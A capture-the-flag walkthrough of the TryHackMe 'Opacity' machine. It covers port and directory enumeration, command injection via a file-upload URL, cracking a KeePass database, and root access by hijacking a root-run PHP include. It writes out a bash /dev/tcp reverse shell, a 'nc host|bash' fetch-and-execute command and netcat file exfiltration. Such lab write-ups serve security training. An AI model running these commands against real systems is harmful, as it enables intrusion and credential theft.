---
title: "TryHackMe - Opacity"
author: Nasrallah
description: ""
date: 2023-04-19 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, cronjob, john, cracking, keepass, codeexecution]
img_path: /assets/img/tryhackme/opacity
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Opacity](https://tryhackme.com/room/opacity) from [TryHackMe](https://tryhackme.com). This is an easy machine where we exploit an upload page vulnerable to code execution to get a shell. One we gained foothold we find a keepass file that contains credentials to a another user, after that we exploit a cronjob and escalate to root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 12:38 +00
Nmap scan report for 10.10.234.152
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
|_  256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-04-11T12:38:43
|_  start_date: N/A
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

We found 4 open ports, 22 running OpenSSH, 80 running an Apache http web server and 139,445 is SMB.

## Web

Let's navigate to the web server.

![](1.png)

We got a login page, i tried default credentials as well as sql injection but no luck with that

### feroxbuster

Let's run a directory/file scans.

```terminal
$ feroxbuster -w /usr/share/wordlists/dirb/big.txt -o scans/fero.txt -u http://10.10.210.15/                                                             
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://10.10.210.15/                                                                                                             
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt                                                                                                
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 💾  Output File           │ scans/fero.txt                                                                                                                   
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🔃  Recursion Depth       │ 4                                                                                                                                
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                   
403      GET        9l       28w      277c http://10.10.210.15/.htaccess
302      GET        0l        0w        0c http://10.10.210.15/ => login.php
403      GET        9l       28w      277c http://10.10.210.15/.htpasswd
301      GET        9l       28w      312c http://10.10.210.15/cloud => http://10.10.210.15/cloud/
403      GET        9l       28w      277c http://10.10.210.15/cloud/.htpasswd
301      GET        9l       28w      310c http://10.10.210.15/css => http://10.10.210.15/css/
403      GET        9l       28w      277c http://10.10.210.15/css/.htaccess
403      GET        9l       28w      277c http://10.10.210.15/css/.htpasswd
403      GET        9l       28w      277c http://10.10.210.15/server-status

```

We found the directory `cloud`, let's check it out.

![](2.png)

We got a file upload page.

I tried uploading a php reverse shell but only images are allowed.

I manged to upload the shell with the extension `.php.png` but the code didn't get executed.

I also tried `SSRF` but that didn't work.

# **Foothold**

After playing with the request in burp suite for some time i found a code execution vulnerability.

![](3.png)

To execute code we can add two semicolons in the `url` and put our code between the two.

I setup a netcat listener and gave a shell file that contains the following reverse shell. `nc -lvnp 1234 < shell.sh`

```bash
sh -i >& /dev/tcp/10.18.0.188/9001 0>&1
```

After that i setup another listener to receive the shell and on burp i executed the following command:

```bash
nc 10.18.0.188 1234|bash
```

This command tell the target to connect to my first listener and after it receives the shell.sh file it pips it to bash which results in the command to get executed and me getting a shell.

![](4.png)

![](5.png)

# **Privilege Escalation**

## sysadmin

After some basic enumeration, we found an interesting file in the `/opt` directory.

![](6.png)

This is a keepass database file which means it may have some passwords.

Let's transfer the file to our machine using the same netcat technique we used earlier

On out attacking box we setup a listener that saves anything that comes to it to a file.

```bash
nc -lvnp 1234 > dataset.kbdx
```

Now on the target machine we send the file using this command.

```bash
nc 10.10.10.10 1234 < datase.kdbx
```

> DOn't forget to change the ip in the command to your tun0 ip.


To read the file we need a password, and that we don't have.

### john

We can use `keepass2john` to extract the hash of the password and then crack it.

![](7.png)

We got the password, now let's read the file.

![](8.png)

Great! We got `sysadmin` password. Let's ssh to the box as sysadmin.

![](9.png)

## root

While i was testing the upload functionality in the website, i noticed that images i upload gets deleted, so there must be a cronjob running.

The `/etc/crontab` file doesn't show anything so i uploaded `pspy64` and run it to find the following results.

![](10.png)

Here we see what the webapp was using to upload the files and how we exploited that.

![](11.png)

And here we see root is running a php scripts that's located in our home directory, let's check that file.

![](12.png)

Unfortunately the file is owned by root and we can't change it and the scripts directory is also owned by root.

We also see that the file `backup.inc.php` in `lib` directory gets called, let's check that file.

![](13.png)

The `backup.inc.php` is also owned by root and we can't change it, but lucky for us, the lib directory belongs to out user `sysadmin` and we can do whatever we want in it.

With that i uploaded a php reverse shell and replaced the `backup.ing.php` with it.

![](14.png)

Now i setup a listener and waited for the shell.

![](15.png)

And just like that we got root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
